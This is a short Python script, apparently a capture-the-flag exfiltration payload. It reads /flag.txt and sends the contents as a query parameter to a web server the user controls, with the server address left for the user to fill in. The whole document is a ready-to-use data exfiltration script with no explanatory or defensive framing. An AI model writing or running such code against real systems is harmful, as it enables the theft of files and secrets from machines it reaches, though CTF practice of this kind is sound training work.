import requests

with open('/flag.txt', 'r') as f:
    flag = f.readline()

#a web server controlled by u
SERVER = "" 
if not SERVER:
    print("put ur web server :p")
    exit()

requests.get(SERVER, params={"flag": flag})
